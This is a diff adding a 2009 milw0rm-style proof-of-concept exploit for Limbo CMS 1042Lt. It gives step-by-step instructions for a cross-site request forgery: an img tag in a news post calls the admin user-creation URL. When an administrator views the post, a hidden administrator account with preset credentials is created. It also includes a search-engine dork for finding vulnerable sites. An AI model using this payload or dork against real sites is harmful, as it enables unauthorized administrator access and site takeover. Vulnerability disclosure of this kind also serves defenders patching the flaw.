@@ -1,0 +1,42 @@
+###############################
+#                             #
+#  Limbo cms v 1042Lt         #
+#  Cross-site request forgery #
+#  Privilege Escalation       #
+#  Proof of Concept           #
+#  by Alfons Luja             #
+#                             #
+###############################
+download : http://www.limboportal.com/index.php/option/downloads/task/download/id/67
+d00rk: intext:"site powered by limbo"  inurl:task=register
+
+  Sytuacion is similar to last vuln in Coppermine 
+  http://milw0rm.com/exploits/8114
+  
+  We need privilege to add news 
+  if we have it then:
+ 
+  1]. Go to : http://target/~limbo/index.php?option=content&task=new&Itemid=[id]
+
+  2]. Set Title : whatever
+
+      Select Category : whatever
+
+      Set Intro text : 
+
+      <img src="http://target/~limbo/admin.php?com_option=users&task=create&user_id=&user_name=toxiclove&user_username=echo&user_email=skk%40sk.pl&user_gid=5&user_password=test1"/>
+      (some html tags is not filtered)
+
+      Set Main Text : whatever 
+      And submit 
+  
+  3]. When admin open this "new" in Control Panel 
+      User toxiclove witch login = echo , pass = test1 && Administartor privilage 
+      Become create 
+
+  4]. The end 
+      Greetings: 
+      tyko dla babci i Gorionka , sIdq , condiego , 0ina , J.Busha , Nejmo , and all friend in a whole planet
+      Sorry for my poor english ;D
+
+# milw0rm.com [2009-04-17]
